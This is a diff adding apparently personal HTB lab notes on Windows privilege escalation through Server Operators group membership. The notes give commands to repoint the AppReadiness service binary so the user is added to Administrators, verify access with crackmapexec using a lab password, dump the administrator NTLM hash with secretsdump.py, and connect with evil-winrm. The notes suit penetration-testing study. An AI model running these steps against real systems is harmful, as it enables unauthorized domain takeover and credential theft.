@@ -35,3 +35,49 @@ SeLoadDriverPrivilege (Exploit the Capcom.sys)
 ----------------------
 In HTB > Windows Privilege Escalation > Windows Group Privilege > Print Operators
 _______________________________________________________________________________________________________________________________________
+Server Operators (exploit AppReadiness service)
+-----------------
+Current User is server_adm , and it's group is Server Operators
+
+In order to exploit SeBackupPrivilege and SeRestorePrivilege must be prsesent whoami /priv session whether it is enabled or disabled
+
+1. Query the service
+
+#sc.exe qc AppReadiness 
+
+2. Checking Service Permissions with PsService
+
+#c:\Tools\PsService.exe security AppReadiness (Server Operators group doen't need permission to control that service)
+
+```
+[ALLOW] BUILTIN\Server Operators
+                All
+```
+3. Checking Local Admin Group Membership
+
+# net localgroup Administrators
+
+4. Servver Operator group must be in admin group
+
+5. Modifying the Service binary path
+
+# sc.exe config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
+
+6. Start the service (Starting the service fails, which is expected.)
+
+# sc.exe start AppReadiness
+
+7. Confirming Local Admin Group Membership
+
+# net localgroup administrators
+
+8. Confirming Local Admin Access on Domain Controller
+
+# crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
+
+9. Retrieving NTLM Password Hashes from the Domain Controller
+
+# secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
+
+10. Use evil-winrm to enter the Administrator.
+_______________________________________________________________________________________________________________________________________
